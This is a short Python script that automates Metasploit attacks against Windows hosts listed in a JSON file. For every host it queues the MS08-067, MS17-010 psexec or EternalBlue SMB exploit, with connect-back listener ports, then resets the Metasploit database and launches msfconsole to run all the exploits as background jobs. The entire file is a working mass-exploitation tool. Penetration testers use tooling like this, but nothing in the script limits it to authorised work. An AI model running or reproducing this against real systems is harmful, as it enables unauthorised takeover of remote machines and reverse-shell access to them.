import os
import json
import subprocess
import sys

def handle_exploitation(exploit_dict, start_port=4444, lhost=None):
    port = start_port  # Necessary because this becomes multithreaded
    commands = []  # List of commands to execute in metasploit

    if len(exploit_dict['ms08-067']) > 0:
        commands.append('use exploit/windows/smb/ms08_067_netapi')
        if lhost:
            commands.append('set lhost {0}'.format(lhost))

        for host in exploit_dict['ms08-067']:
            commands.append('set rhost {0}'.format(host))
            commands.append('set lport {0}'.format(port))
            port += 1
            commands.append('exploit -j')

    # Better for Win XP & 2000
    if len(exploit_dict['ms17-010-psexec']) > 0:
        commands.append('use exploit/windows/smb/ms17_010_psexec')
        if lhost:
            commands.append('set lhost {0}'.format(lhost))

        for host in exploit_dict['ms17-010-psexec']:
            commands.append('set rhost {0}'.format(host))
            commands.append('set lport {0}'.format(port))
            port += 1
            commands.append('exploit -j')

    # Better for Win Vista+
    if len(exploit_dict['ms17-010-eternalblue']) > 0:
        commands.append('use exploit/windows/smb/ms17_010_eternalblue')
        if lhost:
            commands.append('set lhost {0}'.format(lhost))

        for host in exploit_dict['ms17-010-eternalblue']:
            commands.append('set rhost {0}'.format(host))
            commands.append('set lport {0}'.format(port))
            port += 1
            commands.append('exploit -j')

    # Reinit the db so that its up and clean (might change this to be smarter)
    subprocess.run(['msfdb', 'reinit'])
    # Execv to replace this process, fortunately metasploit will handle the inside scripting
    os.execv('/usr/bin/msfconsole', ['msfconsole', '-x', '; '.join(commands)])

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: {0} <exploitable host json filename>'.format(sys.argv[0]))
        exit()

    exploit_dict = None
    with open(sys.argv[1], 'r') as f:
        exploit_dict = json.load(f)

    handle_exploitation(exploit_dict)